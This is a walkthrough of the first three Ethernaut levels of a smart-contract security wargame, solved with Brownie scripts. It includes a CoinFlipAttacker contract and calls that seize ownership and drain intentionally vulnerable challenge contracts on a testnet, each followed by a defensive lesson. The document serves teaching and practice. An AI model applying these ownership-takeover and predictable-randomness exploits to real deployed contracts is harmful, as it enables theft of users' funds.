# Ethernaut
## Setting up Environment
I used Brownie for my development environment. All soltuions are implemented as scripts in `/scripts` 
You will need to obtain an archive URL from Alchemy and create a new development network.
```
brownie networks add development rinkeby-fork cmd=ganache-cli host=http://127.0.0.1 fork=**ARCHIVE URL** accounts=10 mnemonic=brownie port=8545
```
### Setting up account
Brownie has an accounts package that lets you add your own account with your respective private key. To do this you can use the following command:
```
brownie accounts new [name]
```
You will then be prompted to add your private key and set a password to encrypt your private key. 
This is how you can load your account in your scripts: (this will prompt you to input your password)
```
account = accounts.load([name])
```
### Running scripts
First I ran my scripts locally to test my solutions. Then I ran my scripts live on Rinkeby to pass the levels.
```
# run scripts locally
brownie run scripts\fallout.py --network rinkeby-fork
# run scripts live on Rinkeby
brownie run scripts\fallout.py --network rinkeby
```
**Note: All attacker contracts can be found in their respective level's `.sol` file. I.e CoinFlipAttacker can be found in CoinFlip.sol**
## Level 1: Fallback
To beat this level we must claim ownership of the contract and then drain it. We need to become the owner and then we can call `withdraw()`, which has a modifier that only allows the current owner to call the function. 
There are two places where the owner variable can be modified:
1. In the contribute function
```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```
2. In the fallback function
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
The contribute function only lets us send less than 0.001 ether at a time and the owner variable gets modified only when our contributions are greater than the contributions of the current owner. The contributions of the current owner have been set to 1000 ether in the constructor:
```solidity
constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }
```
Therefore, this method is not practical. Now we know that we need to trigger the fallback function in order to set ourselves as the owner.
The require statment in the fallback function checks that our transaction has a value greater than 0 and that our contributions are also greater than 0. We will need to call `contribute()` with an arbitrarily small amount of ether (at least less than 0.001) to satisfy this check.
```python
eth_amount = Web3.toWei("0.00001", "ether")
fallback.contribute({"from": account, "value": eth_amount}) 
```
Once we have called contribute we are now ready to trigger the fallback function. To do this we will execute a simple ether transfer to the contract. We can do this very easily with brownie:
```
account.transfer(fallback, "0.00001 ether")
```
We can check that we are now the owner of the contract:
```python
print(fallback.owner() == account.address)
```
All that is left to do is drain the contract. We will do this by calling `withdraw()`. We will pass the check in the `onlyOwner` modifier since we are now the current owner.
```python
fallback.withdraw({"from": account})
```
We have now successfully passed the level! 
This level shows us that anyone is able to call the fallback function of a contract and execute any code that is in said fallback function. Moral of the story: Be wary of putting code that modifiers sensitive state variables in your fallback function. 

## Level 2: Fallout
To pass this level we need to claim ownership of the contract. We can see that the owner variable only gets modified once in the constructor:
```solidity
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```
We can see that this constructor does not use the `constructor` keyword. Therefore, the name of the constructor function must match the name of the contract in order to be executed as a constructor. 
Note that since `Solidity v0.4.22` this method is now deprecated. Since this contract does not use the `constructor` keyword, the Fal1out function can be seen as any normal function. We can then call this function and become the owner of the contract.
```python
fallout.Fal1out({"from": account})
```
Now we can check that we are the owner of the contract:
```python
print(fallout.owner() == account.address)
```
We have successfully passed this level!
Moral of the story: Use the `constructor` keyword.

## Level 3: Coin Flip
To beat this level we need to call `flip()` with the correct guess 10 times. Every time we call `flip()` with the correct guess, we will increment the `consecutiveWins` state variable. An incorrect guess will set `consecutiveWins` back to 0.
```solidity
if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
```
Lets examine the rest of the function. 
The function first takes the blockhash of the previous block number and stores it in a variable of type uint256 called blockValue.
```solidity
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
```
Then it checks if the state variable `lastHash` is equal to `blockValue`, and will revert if it is
```solidity
if (lastHash == blockValue) {
      revert();
    }
```
If the above check does not resolve to True, then `lastHash` will be set to the value of `blockValue`. The next line sets a new variable named `coinFlip` equal to `blockValue` divided by the state variable `FACTOR`.
```solidity
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```
```solidity
lastHash = blockValue;
uint256 coinFlip = blockValue.div(FACTOR);
```
This next line may look confusing, but it is just a fancy `if statement`.
This:
```solidity
bool side = coinFlip == 1 ? true : false;
```
Is the same as this:
```solidity
if (coinFlip == 1) {
    return true;
} else {
    return false;
}
```
The return value of this if statement is stored in a variable called side. We already took a look at the last piece of code. If `side` is equal to `guess` then we will successfully increment `consecutiveWins`.
This level tries to create a game that relies on randomness. However, the deterministic nature of blockchains makes it impossible to produce a true random number in smart contracts. This contract uses `blockhash`, `block.number`, and a large number stored in `FACTOR` to compute a random boolean value. We know exactly how this contract computes this "random value" and therefore we can create a custom contract that computes the same value in the same way. 
Our contract: 
```solidity
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlip public instance;

    constructor(address _instance) public {
        instance = ICoinFlip(_instance);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue /
            57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;

        instance.flip(side);
    }
}
```
Our contract will have an `attack()` function that will mimic the logic of the CoinFlip contract. `attack()` will compute the same boolean value that the CoinFlip contract computes since both transactions will be in the same block and `block.number - 1` will produce the same value. Once the answer is computed and stored in `side`, we can call `flip()` with `side` as an argument. This will ensure that our guess is in fact the right answer. We will repeat this 10 times:
```python
for i in range(10):
    CoinFlipAttacker.attack({"from": account})
```
We can check to see that we have called `flip()` will the correct guess 10 times:
```python
print(CoinFlip.consecutiveWins() == 10)
```
We have successfully passed the level! Moral of the story: Do not use `blockhash`, `block.number`, or any hardcoded values for random number generation. Note that although we created a custom contract to mimic the use of `blockhash` and `block.number`, those values can also be manipulated by miners. You are better off using oracle services for random number generation, such as `Chainlink VRF`.

